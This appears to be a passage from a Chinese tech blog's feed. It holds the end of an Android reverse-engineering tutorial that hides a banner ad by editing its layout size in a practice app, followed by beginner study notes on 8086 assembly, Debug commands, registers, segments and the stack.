href="#图片横幅广告" class="headerlink" title="图片横幅广告"></a>图片横幅广告</h2><p>这种图片形式的，无法通过关键字搜索，我们通过<code>开发助手</code>的布局查看来看一下这个图片的一个资源id<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318200650.png"><br>打开布局查看器之后再次打开软件，选中广告位，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318200736.png"><br>选中会有一个<code>View ID(hex)</code>，复制这个内容，去用这个资源的id去np管理器中搜索，查询到他的位置<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318201025.png"><br>打开这个文件之后会发现id根本就不存在，我们再去通过jdax去搜索这个id，发现了一个资源名称，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318201748.png"><br>他的名字是<code>third_ad_image</code>，这个是可以在那个资源文件中找到的，这刚好对应起来了<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318202134.png"><br>找到这个内容之后我们修改他的布局属性，高度和宽度，它默认的是<code>wrap_content</code>和<code>150.0dip</code>我们都给他修改成0dp，然后再此打开软件，成功的变成了无广告。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318202349.png"></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>我要速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速成逆向🤓👌</p>]]></content>
    
    
    <summary type="html">写在前面
相关教程： https://www.bilibili.com/video/BV1wT411N7sV
相关帖子： https://www.52pojie.cn/thread-1706691-1-1.html
相关附件可以从相关帖子中拿到地址，这里不多说环境相关的内容了。

广告展示
打开软件的第三关，打开之后有一个等待三秒的提示如下图

提示完毕之后的内容是一号弹窗


广告去除
给爷停三秒
在MT管理器的Activity的记录中，找到下面内容

这代表当前等待的这个页面的名字是AdActivity，我们通过jadx-gui找到这个位置

查看这个函数发现下面java代码

1
2
3</summary>
    
    
    
    <category term="逆向工程" scheme="https://blog.boychai.xyz/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="Android" scheme="https://blog.boychai.xyz/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/Android/"/>
    
    
    <category term="REVERSE" scheme="https://blog.boychai.xyz/tags/REVERSE/"/>
    
    <category term="Android" scheme="https://blog.boychai.xyz/tags/Android/"/>
    
    <category term="smali" scheme="https://blog.boychai.xyz/tags/smali/"/>
    
  </entry>
  
  <entry>
    <title>8086CPU汇编学习</title>
    <link href="https://blog.boychai.xyz/2025/03/10/8086CPU%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://blog.boychai.xyz/2025/03/10/8086CPU%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-10T16:01:00.000Z</published>
    <updated>2025-07-17T05:40:18.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>没想到我有一天会去研究汇编，这是我从未设想的道路。😭</p><h1 id="学习环境安装"><a href="#学习环境安装" class="headerlink" title="学习环境安装"></a>学习环境安装</h1><p>项目地址： <a href="https://github.com/HaiPenglai/bilibili_assembly/">https://github.com/HaiPenglai/bilibili_assembly/</a><br>教学视频： <a href="https://www.bilibili.com/video/BV1eG4y1S7R5">https://www.bilibili.com/video/BV1eG4y1S7R5</a><br>安装配置具体可以参考视频，非常详细，本文不多介绍环境的安装与配置。</p><h1 id="基础指令与寄存器"><a href="#基础指令与寄存器" class="headerlink" title="基础指令与寄存器"></a>基础指令与寄存器</h1><h2 id="Debug命令"><a href="#Debug命令" class="headerlink" title="Debug命令"></a>Debug命令</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Debug是DOS、Windows都提供的实模式(8086 方式)程序的调试工具。使用它，可以查看CPU各种寄存器中的内容，内存的情况和机器码级跟踪程序的运行。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>R命令 查看、改变CPU寄存器的内容。</li><li>D命令 查看内存中的内容。</li><li>E命令 改写内存中的内容。</li><li>U命令 将内存中的机器指令翻译成汇编指令。</li><li>T命令 执行一条机器命令。</li><li>A命令 以汇编指令的格式在内存中写入一条机器指令。</li></ul><h2 id="寄存器层级"><a href="#寄存器层级" class="headerlink" title="寄存器层级"></a>寄存器层级</h2><p>在 x86 架构的汇编语言中，寄存器的命名和使用方式有一定的规律。在Debug中，使用<code>R</code>指令可以看到寄存器中的内容<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308200824.png"><br>以AX为例，他的内容是<code>0000</code>，他拥有<code>16位</code>，在汇编指令中<code>AX</code>即直接代表这个<code>16位</code>寄存器，如果是<code>AH</code>和<code>AL</code>则代表<code>8位</code>寄存器，<code>H</code>是高位，<code>L</code>是低位，当前是X86的，如果是64的他还有<code>32位</code>，即<code>EAX</code>。</p><h2 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h2><p>MOV是做替换，在DEBUG中，执行下面汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,13</span><br><span class="line">mov bl,33</span><br><span class="line">mov ch,al</span><br></pre></td></tr></table></figure><p>执行过后ax寄存器的高位变成了13，bx的低位变成了33，cx的低位变没变，因为他把cx的高位修改成了ax的低位，ax的低位本身没内容即00。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308201648.png"></p><h2 id="ADD指令"><a href="#ADD指令" class="headerlink" title="ADD指令"></a>ADD指令</h2><p>ADD是做加法，在DEBUG中，执行下面汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add ax,13</span><br><span class="line">add bx,8</span><br><span class="line">add cx,bx</span><br></pre></td></tr></table></figure><p>AX从1300变成了1313，因为加了13，bx从0033变成了003B，他这里展示的是16进制，3+8&#x3D;11，11刚好对应B，然后CX本身就是0000，加上bx那就是003B<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308203125.png"></p><h2 id="SUB指令"><a href="#SUB指令" class="headerlink" title="SUB指令"></a>SUB指令</h2><p>SUB是做减法，在DEBUG中，执行下面汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub ax,8</span><br><span class="line">mov bx,F</span><br><span class="line">sub ax,bx</span><br></pre></td></tr></table></figure><p>第一条是1313-8，即130B(11)，之后bx改为F(15)，用ax即130B-F则AX&#x3D;12FC，相当于130B(11)-15 12F(15)C(12)<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308204550.png"></p><h2 id="MUL指令"><a href="#MUL指令" class="headerlink" title="MUL指令"></a>MUL指令</h2><p>mul是乘法指令，使用mul做乘法的时候需要注意下面两点</p><ul><li>相乘：两个相乘的数，要么都是8位，要么就都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中，如果是16位，一个默认在ax中，另一个放在16位reg或内存字单元中。</li><li>结果：如果是8位乘法，结果默认放在AX中，如果是16位乘法，结果高位默认在DX中存放，低位在AX中放。</li></ul><p>例如我要做100*10的运算，他应该是执行下面的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,64</span><br><span class="line">mov bl,A</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><p>64是100的16进制，A是10的16进制，然后mul是运算，得到03E8，03E8刚好是1000的16进制。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308211341.png"><br>下面做一个100*10000的运算，他会不会出现溢出？100小于255，可是10000大于255，所以必须走16位的乘法，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,64</span><br><span class="line">mov bx,2710</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><p>这个正常的答案应该是1000000，16进制即F4240，在执行之后的结果中，因为位数不够他会把低位放到AX中，高位放到DX中，DX即F，AX就是4240，实际就是F4240即1000000。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250308212718.png"></p><h2 id="DIV指令"><a href="#DIV指令" class="headerlink" title="DIV指令"></a>DIV指令</h2><p>div是除法指令，使用div做除法的时候应该注意一下问题</p><ul><li>除数：有8位和16位两种，在一个reg或内存单元中。</li><li>被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果出书为16位，被出示则为32位，在DX和AX中存放，DX存放高位16位，AX存放低位16位。</li><li>结果：如果除数为8位，则AL存储触发操作的商，AH存储触发操作的余数；如果储是为16位，则AX存储除法操作的商，DX存储法操作的余数。</li></ul><p>下面做一个10000&#x2F;100的一个计算，10000的16进制是2710，100的16进制是64，那么计算的汇编代码将是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2710</span><br><span class="line">mov bl,64</span><br><span class="line">div bl</span><br></pre></td></tr></table></figure><p>运行div之后他把答案最终放置到了ax中，64即16进制的100，10000&#x2F;100&#x3D;100<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309114424.png"><br>上面这种情况一个是被除数是16位，如果计算1000000&#x2F;10000，10000000的16进制数是F4240，很显然16位数是放不下的，那就需要把高位放到dx中，参考下面的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,F</span><br><span class="line">mov ax,4240</span><br><span class="line">mov bx,2710</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>成功运行那道ax中的运行结果64即10进制的100。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309115246.png"><br>如果运算结果中有余数呢？这里也可以做一下试验，1000001&#x2F;10000的结果应该是100余1，我们执行下面汇编代码来查看结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,F</span><br><span class="line">mov ax,4241</span><br><span class="line">mov bx,2710</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>这里发现余数会存储在dx寄存器中。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309115715.png"><br>上面的是一个32位占用的被除数，如果被除数是8位，则AL存储除法操作的商，AH放余数，可以参考10001&#x2F;100，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2711</span><br><span class="line">mov bl,64</span><br><span class="line">div bl</span><br></pre></td></tr></table></figure><p>结果应该是100余1，对应的al的值则就是64，ah的值则就是1<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309120520.png"></p><h2 id="AND指令"><a href="#AND指令" class="headerlink" title="AND指令"></a>AND指令</h2><p>and指令的作用是按位进行与运算，举个例子<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309121405.png"><br>0和0则就是0，1和0还是0，1和1即1，参考汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,63(01100011B)</span><br><span class="line">and al,3B(00111011B)</span><br></pre></td></tr></table></figure><p>执行过后会把内容丢到al中，运行结果应该是00100011即16进制的23。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309121909.png"></p><h2 id="OR指令"><a href="#OR指令" class="headerlink" title="OR指令"></a>OR指令</h2><p>or指令的作用是按位进行或运算，举个例子<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309122149.png"><br>0和0就是0，1和1就是1，1和0就是1，0和1也是1，参考汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,63(01100011B)</span><br><span class="line">or al,7B(01111011B)</span><br></pre></td></tr></table></figure><p>二进制结果应该是01111011，16进制即7B。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309122321.png"></p><h2 id="SHL和SHR指令"><a href="#SHL和SHR指令" class="headerlink" title="SHL和SHR指令"></a>SHL和SHR指令</h2><p>shel和shr分别代表左移和右移，左移就是左边去除一个右边补0，右移则就是右边移除一个左边补零。如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309123232.png"><br>参考汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,63</span><br><span class="line">shl al,1</span><br><span class="line">shr al,1</span><br></pre></td></tr></table></figure><p>63的二进制是01100011即16进制63，左移一位二进制变成11000110即16进制C6，右移一位则就变回去了即01100011即16进制的63。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309123522.png"></p><h2 id="ROL和ROR指令"><a href="#ROL和ROR指令" class="headerlink" title="ROL和ROR指令"></a>ROL和ROR指令</h2><p>他俩是循环左移和循环右移，他和普通的左移和右移区别是，循环左移是把最右边的一位补到最左边，循环右移是把最左边的一位补到右边，参考下面的汇编代码查看区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,FF</span><br><span class="line">rol al,1</span><br><span class="line">shl al,1</span><br></pre></td></tr></table></figure><p>FF的2进制是11111111，不管是循环左移还是右翼都是会把一边的1补到另一边，而shl和shr是补0。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309130428.png"></p><h2 id="INC和DEC指令"><a href="#INC和DEC指令" class="headerlink" title="INC和DEC指令"></a>INC和DEC指令</h2><p>INC和DEC的作用是增加1和减少1，例如C语言中的++和–，例子汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">inc al</span><br><span class="line">dec al</span><br></pre></td></tr></table></figure><p>这个不错介绍，需要注意的是，如果本身是al是00，再去给他dec(–)那么他就会变成FF，对应的如果是al是FF再去给他inc(++)那就会变成00。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309131638.png"></p><h2 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a>NOP指令</h2><p>这个指令是空代码段，执行不会干任何事情，他所占的空间恰好是1个字节。这里不多说，后面会用到。</p><h2 id="XCHG指令"><a href="#XCHG指令" class="headerlink" title="XCHG指令"></a>XCHG指令</h2><p>xchg指令的作用是做数据调换，参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,11</span><br><span class="line">mov bl,22</span><br><span class="line">xchg al,bl</span><br></pre></td></tr></table></figure><p>al和bl的内容互换了，如果是不通过这个指令来去作交换，则需要三个地方存储数据，A把数据给C，然后B把数据给A，再然后C给B这样才能呼唤，这个指令可以直接交换。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309132351.png"></p><h2 id="NEG指令"><a href="#NEG指令" class="headerlink" title="NEG指令"></a>NEG指令</h2><p>neg的作用是取反并加 1，如果原数据为<code>00000001</code>，通过neg取反+1就是<code>11111110</code>+<code>00000001</code>，具体汇编代码参考如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">neg al</span><br></pre></td></tr></table></figure><p>00000001取反就是11111110，再去加1那就是FF了，这里不多说。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309140106.png"></p><h2 id="INT指令"><a href="#INT指令" class="headerlink" title="INT指令"></a>INT指令</h2><p>INT指令的含义是中断，在做除法运算的时候如果除数为0那就会自动触发<code>int 0</code>这个指令，也可以手动执行这个指令，这个指令最终会把内存的执行指针做一个跳转，跳转到最初的位置，具体参考案例如下，第一个是除法除以0，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,123</span><br><span class="line">mov bl,0</span><br><span class="line">div bl</span><br></pre></td></tr></table></figure><p>运行到div命令开始执行除法的时候，把CS和IP调到F000和1060，这个就是执行int 0会发生的事，出现问题则会跳转到这个位置。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309142035.png"><br>第二个例子直接运行<code>int 0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 0</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309142243.png"><br>这俩寄存器是用来存储执行代码位置的，他这里直接跳转了。<br>中断编号有很多，这里是调用的0，除法出现错误也会调用中断0，还有很多后面慢慢接触就可以了。</p><h1 id="进阶指令与寄存器"><a href="#进阶指令与寄存器" class="headerlink" title="进阶指令与寄存器"></a>进阶指令与寄存器</h1><h2 id="物理地址、段地址、偏移地址关系"><a href="#物理地址、段地址、偏移地址关系" class="headerlink" title="物理地址、段地址、偏移地址关系"></a>物理地址、段地址、偏移地址关系</h2><p>我这里说的都是基于8086CPU的内容，其他的可能和我这个不一样的。CPU在访问内存的时候，会用一个基础地址(段地址*16)和一个相对地址的偏移地址相加，给出内存单元的物理地址。<br>更一般的说，8086CPU的这种寻址功能是“基础地址+偏移地址&#x3D;物理地址”寻址模式的一种具体实现方案。8086CPU中，段地址x16可看作是基础地址。</p><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>在8086CPU中，访问内存时要由相关部件提供内存单元的段地址和偏移地址，送入地址加法器合成物理地址。这里，需要看一下，什么是部件提供段地址。段地址在8086CPU中段寄存器中存放。8086CPU有4个段寄存器：CS、DS、SS、ES。当8086CPU要访问内存时由这四个段寄存器提供内存单元的段地址。</p><h2 id="关于内存写入数据"><a href="#关于内存写入数据" class="headerlink" title="关于内存写入数据"></a>关于内存写入数据</h2><p>通过Debug程序的e命令可以直接对内存中的数据做修改，可以参考下面截图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250309183659.png"></p><h2 id="DS寄存器-数据段地址"><a href="#DS寄存器-数据段地址" class="headerlink" title="DS寄存器-数据段地址"></a>DS寄存器-数据段地址</h2><p>CPU要读写一个内存单元的时候，必须先给出这个内存单元的地址，在8086PC中，内存地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段和地址。举个例子，通过下面debug命令在<code>21f6:0000</code>的位置写入一点内容，命令如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310085436.png"><br>再去修改DS寄存器的内容，DS寄存器的内容应该是数据段的地址，例如采用debug命令去直接修改DS(段寄存器是不可以直接mov数值修改，需要通过其他寄存器进行赋值)寄存器的内容，参考命令截图如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310085535.png"><br>通过mov去赋值DS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,21f6</span><br><span class="line">mov ds,ax</span><br></pre></td></tr></table></figure><p>要注意直接去<code>mov ds,21f6</code>是不可行的，他是一个段寄存器在设计的时候就不允许这样。<br>去执行下面的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov al,[0]</span><br></pre></td></tr></table></figure><p>执行之后结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310085639.png"><br>al寄存器变成了12，这个12是哪里来的呢？在执行mov指令的时候，给的值是<code>[0]</code>这个值是指基于数据段地址的偏移，也就是基于DS,21F6这个位置的第0偏移的数据内容给al，即12。<br>在看一个案例，还是上面的内容，执行下面的汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov bx,[2]</span><br></pre></td></tr></table></figure><p>结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310093528.png"><br>为什么BX是7856？bx给的是216f的第2位，也就是从56开始，数值应该是<code>5678</code>，变成7856的原因是因为他要对其高低位，低位在bl，高位在bh，高位是78，低位是56，对其之后bx就是7856。</p><h2 id="CS和IP指令"><a href="#CS和IP指令" class="headerlink" title="CS和IP指令"></a>CS和IP指令</h2><p>CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指令指针寄存器，从名称上我们可以看出它们和指令的关系。先看个案例，我们先在2000:0000的位置写入一些汇编指令，参考指令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a 2000:0000</span><br><span class="line">mov ax,0123</span><br><span class="line">mov bx,0003</span><br><span class="line">mov ax,bx</span><br><span class="line">add ax,bx</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310095922.png"><br>执行过后看一下对应位置的内容，发现里面的内容根本看不懂，这里的内容是刚才汇编指令的机器码，可以使用debug的u命令去看这些内容到底是执行的什么内容，参考下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310100052.png"><br>使用u命令可以看到咱们刚才输入的指令，具体怎么执行这些指令呢，这里就可以通过修改cs和ip寄存器来指定咱们写入命令的位置，再去使用t即可执行咱们这些指令，具体操作如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310100419.png"><br>这个时候就相当于命令的指针指向了这里，通过t命令去执行命令结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310100546.png"><br>发现咱们再2000:0000设置的指令都依次执行了。</p><h2 id="JMP指令"><a href="#JMP指令" class="headerlink" title="JMP指令"></a>JMP指令</h2><p>jmp是一个跳转指令，具体的作用可以做一个实践，根据下图把命令写入内存。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310101904.png"><br>具体命令参考如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310102246.png"><br>我们把指针跳转到2000:0000开始执行命令，具体命令参考如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310102728.png"><br>当我们执行第二次的时候也就是命令<code>jmp 1000:3</code>的时候，cs和ip变成了1000和0003，下一个命令就会去执行<code>mov ax,0000</code>了，继续执行查看结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310103523.png"><br>继续执行会发现，他后面会有个jmp指令，jmp的参数是bx，bx是0000，就是把ip改为0000，那就是从<code>mov ax,0123</code>从头继续执行，然后一直重复，如果一直去执行那么这就是一个死循环。</p><h2 id="栈概念"><a href="#栈概念" class="headerlink" title="栈概念"></a>栈概念</h2><p>栈是一种后进先出的数据结构，通常用于存储临时数据、管理函数调用和返回地址。栈在内存中通常从高地址向低地址增长，用于保存寄存器值、局部变量等。简单说，就是程序运行时的“临时记事本”。</p><h2 id="SS和SP寄存器"><a href="#SS和SP寄存器" class="headerlink" title="SS和SP寄存器"></a>SS和SP寄存器</h2><p>这两个寄存器用来定义栈顶的位置，基于栈的操作都是基于这俩寄存器指定的位置来做操作。这俩也是段指令，无法直接<code>mov xx,数值</code>来直接赋值，得通过<code>mov 寄存器,段寄存器</code>来修改，或者通过debug名的r命令去修改。</p><h2 id="PUSH和POP指令"><a href="#PUSH和POP指令" class="headerlink" title="PUSH和POP指令"></a>PUSH和POP指令</h2><p>push就是压栈，指的是将一个元素添加到栈的顶部。pop就是出栈，指的是从栈的顶部移除并返回一个元素。<br>push和pop指令具体可以参考下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310112303.png"><br>下面做个实验，我们先指定1000:0010这块内存作为栈实验的栈顶，用来做压栈和出栈的实验，通过debug的r命令来修改ss和sp段寄存器，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310112811.png"><br>我们根据最上面的指令进行操作，我们先把指令写进去然后一步一步去执行，具体的汇编指令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123</span><br><span class="line">push ax</span><br><span class="line">mov bx,2266</span><br><span class="line">push bx</span><br><span class="line">mov cx,1122</span><br><span class="line">push cx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line">pop cx</span><br></pre></td></tr></table></figure><p>先去执行前两条查看一下栈里的内容有啥变化<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310113246.png"><br>0123被压入栈了，而且是顶部，并且SP也发生了更变，我们继续把压栈的命令都执行完，还剩4条，看一下结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310113424.png"><br>全部压进去了，并且位置是往小的来推进的。<br>接着我们继续执行指令，还有三条pop指令，先执行一条查看一下效果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310113748.png"><br>原本栈内的2211，已经被丢到ax中了，并且他是把第一个丢到低位，然后第二个丢到高位中，这个操作不回去平衡高低位。接着继续执行两个pop命令，执行结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310114159.png"><br>栈内的数据以此丢到了bx和cx中了，并且栈内也没内容了，这里的内容其实我举得例子不好，应该找一块全空的位置来去做这个实验。这里他自动填充了其他数据。</p><h2 id="BX寄存器的独特性"><a href="#BX寄存器的独特性" class="headerlink" title="BX寄存器的独特性"></a>BX寄存器的独特性</h2><p>bx寄存器有一个额外的作用，就是它可以来指明内存单元，这个是其他大部分寄存器做不到的，举个例子，在2000:100的位置放一些数据，命令如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310141934.png"><br>修改DS数据段的地址为2000，然后通过偏移位置来去设置其他寄存器的内容，命令如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310142305.png"><br>这里发现ax成功更变成了2000:100位置的内容，这个在上面也进行过，下面开始通过bx来去当作编译来去拿数据，命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0102</span><br><span class="line">mov ax,[bx]</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310142447.png"><br>这里发现通过bx的偏移设置了ax的内容，他还有其他的写法，具体命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx-1]</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310142632.png"><br>这样也是可以的，本身bx是<code>0102</code>通过<code>[bx-1]</code>那就是<code>0101</code>的偏移位置来写入ax，把寄存器当作偏移的操作只有bx能做到，尝试其他的会报错，具体错误可以参考下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310142844.png"><br>使用<code>mov cx,[ax]</code>和<code>mov ax,[cx]</code>都是不可行的，这个功能是bx单独的功能但不是他独有的功能，后面会说其他的，这个bx寄存器也一般用来存储偏移地址。</p><h2 id="SI和DI寄存器"><a href="#SI和DI寄存器" class="headerlink" title="SI和DI寄存器"></a>SI和DI寄存器</h2><p>si和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。具体使用方法和上面BX寄存器一样。然后这些可以用来当作偏移来用的寄存器可以相加，例如下面汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov cx,[bx+si]</span><br><span class="line">mov cx,[bx+di]</span><br><span class="line"># 下面这个不允许</span><br><span class="line">mov cx,[si+di]</span><br></pre></td></tr></table></figure><h2 id="BP寄存器"><a href="#BP寄存器" class="headerlink" title="BP寄存器"></a>BP寄存器</h2><p>他和上面的BX、SI、DI用处都是可以指明内存单元。但是BP在用法上和它们三个是有区别的，BX、SI、DI采用这三个寄存器去寻址的时候，他是基于DS寄存器来做偏移找内容，而BP是基于SS寄存器，这个SS寄存器上面也讲述了他是用来设置栈顶的段地址的，BP也可以理解为基于栈顶的位置偏移找内容。具体可以参考下面的案例，我在<code>5000:0000</code>和<code>6000:0000</code>的位置存放了一些内容，一个正序一个倒叙<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310154216.png"><br>下面我把这俩位置分给数据段地址和栈顶的位置，参考下面代码<br><img 